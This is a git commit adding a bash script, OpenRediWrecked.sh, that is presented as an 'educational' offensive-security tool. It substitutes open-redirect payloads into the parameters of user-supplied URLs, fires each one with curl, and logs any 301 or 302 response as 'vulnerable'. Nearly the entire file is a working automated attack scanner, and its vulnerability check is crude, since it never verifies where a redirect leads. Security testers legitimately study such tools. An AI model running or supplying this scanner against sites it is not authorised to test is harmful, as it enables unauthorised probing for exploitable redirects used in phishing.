3a14301d17df27fb2e38779f1932e887b7437069
Black Hat Ethical Hacking <chris@blackhatethicalhacking.com>
2023-02-10 20:45:01 +0200

    Add files via upload

---
+++ OpenRediWrecked.sh
@@ -0,0 +1,68 @@
+#!/bin/bash
+curl --silent "https://raw.githubusercontent.com/blackhatethicalhacking/Subdomain_Bruteforce_bheh/main/ascii.sh" | lolcat
+echo ""
+# Generate a random Sun Tzu quote for offensive security
+
+# Array of Sun Tzu quotes
+quotes=("The supreme art of war is to subdue the enemy without fighting." "All warfare is based on deception." "He who knows when he can fight and when he cannot, will be victorious." "The whole secret lies in confusing the enemy, so that he cannot fathom our real intent." "To win one hundred victories in one hundred battles is not the acme of skill. To subdue the enemy without fighting is the acme of skill.")
+
+# Get a random quote from the array
+random_quote=${quotes[$RANDOM % ${#quotes[@]}]}
+
+# Print the quote
+echo "Offensive security tip: $random_quote - Sun Tzu" | lolcat
+sleep 1
+echo "MEANS, IT'S ☕ 1337 ⚡ TIME, 369 ☯ " | lolcat
+sleep 1
+figlet -w 80 -f small OpenRediWrecked | lolcat
+echo ""
+echo "[YOUR ARE USING OpenRediWrecked.sh] - (v1.0) CODED BY Chris 'SaintDruG' Abou-Chabké WITH ❤ FOR blackhatethicalhacking.com for Educational Purposes only!" | lolcat
+sleep 1
+#check if the user is connected to the internet
+tput bold;echo "CHECKING IF YOU ARE CONNECTED TO THE INTERNET!" | lolcat
+# Check connection
+wget -q --spider https://google.com
+if [ $? -ne 0 ];then
+    echo "++++ CONNECT TO THE INTERNET BEFORE RUNNING ScopeHunter.sh!" | lolcat
+    exit 1
+fi
+tput bold;echo "++++ CONNECTION FOUND, LET'S GO!" | lolcat
+
+echo "Enter path to URLs with parameters: "
+read urls_file
+
+echo "Enter path to OpenRedirect Payloads: "
+read payloads_file
+
+echo "Sorting parameters and adding 'OPENRPAYLOAD' to URLs..."
+urls=$(cat $urls_file | sed "s/\?.*/\?OPENRPAYLOAD/g")
+echo "Sorting complete. Starting attack..."
+
+echo ""
+
+num_of_urls=0
+num_of_vul_urls=0
+
+while read url
+do
+  while read payload
+  do
+    response=$(curl -L --silent --write-out "%{http_code}" "${url/$"OPENRPAYLOAD"/$payload}")
+    ((num_of_urls++))
+    if [ "$response" != "302" ] && [ "$response" != "301" ]; then
+      echo -e "\033[0;31mTesting URL: ${url/$"OPENRPAYLOAD"/$payload}\033[0m"
+      echo "Not Vulnerable"
+    else
+      domain=$(echo "${url/$"OPENRPAYLOAD"/$payload}" | awk -F/ '{print $3}')
+      echo -e "\033[0;32mTesting URL: ${url/$"OPENRPAYLOAD"/$payload}\033[0m"
+      echo "Vulnerable"
+      echo "${url/$"OPENRPAYLOAD"/$payload}" >> "${domain}_vulnerable_urls.txt"
+      ((num_of_vul_urls++))
+    fi
+  done < $payloads_file
+done < <(echo "$urls")
+
+echo ""
+echo "Attack complete."
+echo "Number of URLs tested: $num_of_urls"
+echo "Number of vulnerable URLs found: $num_of_vul_urls"
